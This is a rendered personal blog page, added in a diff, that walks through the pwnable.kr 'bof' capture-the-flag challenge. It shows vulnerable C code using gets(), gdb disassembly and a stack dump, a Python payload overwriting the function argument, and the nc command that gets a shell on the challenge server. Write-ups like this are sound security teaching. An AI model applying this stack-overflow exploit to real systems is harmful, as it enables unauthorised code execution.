@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Buffer Overflow">
+  <meta property="og:description" content="exploiting a classic stack-based buffer overflow in a C program">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Buffer Overflow</title>
+  <meta name="description" content="exploiting a classic stack-based buffer overflow in a C program">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Buffer Overflow</b></h1>
+
+<p class="post-metadata text-muted">
+  18 August 2023 -  
+  <b>4 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#bufferoverflow">
+      <span class="tag badge badge-pill text-primary border border-primary">BufferOverflow</span>
+    </a>
+    </p>
+
+<h2 id="analyze">Analyze</h2>
+
+<p>Let’s start with source code.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>main function call <code class="language-plaintext highlighter-rouge">func</code> with argument <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>.</p>
+
+<p>lets take look at <code class="language-plaintext highlighter-rouge">func()</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</code></pre></div></div>
+<p>it create <code class="language-plaintext highlighter-rouge">overflowme</code> variable and asign 32 buffer space.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>
+</code></pre></div></div>
+<p>next it print “overflow me” and then read value from user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+</code></pre></div></div>
+
+<p>it check if <code class="language-plaintext highlighter-rouge">key</code>  is equal to <code class="language-plaintext highlighter-rouge">0xcafebabe</code> if yes then it give a shell otherwise it print <code class="language-plaintext highlighter-rouge">Nah..</code>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>In this challenge we doesn’t need to find offset and create shellcode.
+we just need to overwrite <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> with <code class="language-plaintext highlighter-rouge">0xcafebabe</code> and we can spawn shell.</p>
+
+<p>lets play with  binary in gdb.</p>
+
+<p>First we set breakpoint at <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  <span class="nb">break </span>main                                                                                            
+Breakpoint 1 at 0x68d                                 
+gef➤  run  
+</code></pre></div></div>
+
+<p>Now program stop executing at <code class="language-plaintext highlighter-rouge">main</code>. Lets disassemble <code class="language-plaintext highlighter-rouge">func</code> and see how it work.</p>
+
+<pre><code class="language-asm">gef➤  disass func
+Dump of assembler code for function func:
+   0x5655562c &lt;+0&gt;:     push   ebp
+   0x5655562d &lt;+1&gt;:     mov    ebp,esp
+   0x5655562f &lt;+3&gt;:     sub    esp,0x48
+   0x56555632 &lt;+6&gt;:     mov    eax,gs:0x14
+   0x56555638 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x5655563b &lt;+15&gt;:    xor    eax,eax
+   0x5655563d &lt;+17&gt;:    mov    DWORD PTR [esp],0x5655578c
+   0x56555644 &lt;+24&gt;:    call   0xf7e3e330 &lt;puts&gt;
+   0x56555649 &lt;+29&gt;:    lea    eax,[ebp-0x2c]
+   0x5655564c &lt;+32&gt;:    mov    DWORD PTR [esp],eax
+   0x5655564f &lt;+35&gt;:    call   0xf7e3d850 &lt;gets&gt;
+   0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x5655565b &lt;+47&gt;:    jne    0x5655566b &lt;func+63&gt;
+   0x5655565d &lt;+49&gt;:    mov    DWORD PTR [esp],0x5655579b
+   0x56555664 &lt;+56&gt;:    call   0xf7e12f10 &lt;system&gt;
+   0x56555669 &lt;+61&gt;:    jmp    0x56555677 &lt;func+75&gt;
+   0x5655566b &lt;+63&gt;:    mov    DWORD PTR [esp],0x565557a3
+   0x56555672 &lt;+70&gt;:    call   0xf7e3e330 &lt;puts&gt;
+   0x56555677 &lt;+75&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x5655567a &lt;+78&gt;:    xor    eax,DWORD PTR gs:0x14
+   0x56555681 &lt;+85&gt;:    je     0x56555688 &lt;func+92&gt;
+   0x56555683 &lt;+87&gt;:    call   0xf7ee1930 &lt;__stack_chk_fail&gt;
+   0x56555688 &lt;+92&gt;:    leave  
+   0x56555689 &lt;+93&gt;:    ret    
+End of assembler dump.
+
+</code></pre>
+
+<p>on <code class="language-plaintext highlighter-rouge">0x56555654</code> we can see it compare <code class="language-plaintext highlighter-rouge">0xcafebabe</code> with <code class="language-plaintext highlighter-rouge">func</code> argument which is <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>.</p>
+
+<p>we set breakpoint exactly <code class="language-plaintext highlighter-rouge">0x56555654</code>.</p>
+
+<p>Set breakpoint and continue executation.it ask for input. we provide <code class="language-plaintext highlighter-rouge">bbbbbbbbbbbbbbb</code>. here we need to provide short input because we don’t want to crash the program. we just want to see normal executation flow of program.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  <span class="nb">break</span> <span class="k">*</span>0x56555654
+Breakpoint 2 at 0x56555654
+gef➤  c
+Continuing.
+overflow me : 
+bbbbbbbbbbbbbbb 
+</code></pre></div></div>
+
+<p>program hit our second breakpoint. now lets examine the memory.</p>
+
+<pre><code class="language-asm">gef➤  x/50wx $esp
+0xffffd590:     0xffffd5ac      0x00000000      0xf7ffd000      0x00000000
+0xffffd5a0:     0x00000000      0x00000000      0x56555034      0x62626262
+0xffffd5b0:     0x62626262      0x62626262      0x00626262      0x5655549d
+0xffffd5c0:     0xf7fb33fc      0xffffffff      0x56556ff4      0x2afbe700
+0xffffd5d0:     0x56556ff4      0xf7fb3000      0xffffd5f8      0x5655569f
+0xffffd5e0:     0xdeadbeef      0x00000000      0x565556b9      0x00000000
+0xffffd5f0:     0xf7fb3000      0xf7fb3000      0x00000000      0xf7decdf6
+0xffffd600:     0x00000001      0xffffd6a4      0xffffd6ac      0xffffd634
+0xffffd610:     0xffffd644      0xf7ffdb40      0xf7fcd410      0xf7fb3000
+0xffffd620:     0x00000001      0x00000000      0xffffd688      0x00000000
+0xffffd630:     0xf7ffd000      0x00000000      0xf7fb3000      0xf7fb3000
+0xffffd640:     0x00000000      0xa4e739cb      0xe6d067db      0x00000000
+0xffffd650:     0x00000000      0x00000000
+</code></pre>
+
+<p>here we can see our input we give <code class="language-plaintext highlighter-rouge">b</code> as <code class="language-plaintext highlighter-rouge">0x62</code>. and at <code class="language-plaintext highlighter-rouge">0xffffd5e0</code> memory address <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>.</p>
+
+<p>Next we have to find out how many bytes we need to overwrite <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. here we need 13*4=52 byets to overwrite <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. now we can build our payload.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'print "a" * 52 + "</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">" '</span> <span class="o">&gt;</span> <span class="n">exploit</span>
+</code></pre></div></div>
+<p>we save our payload as <code class="language-plaintext highlighter-rouge">exploit</code> and send this to server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  temp <span class="o">(</span><span class="nb">cat </span>exploit <span class="o">&amp;&amp;</span> <span class="nb">cat</span><span class="o">)</span> | nc pwnable.kr 9000
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>bof<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>bof<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1008<span class="o">(</span>bof<span class="o">)</span>
+<span class="nb">cat </span>flag
+daddy, I just pwned a buFFer :<span class="o">)</span>
+</code></pre></div></div>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
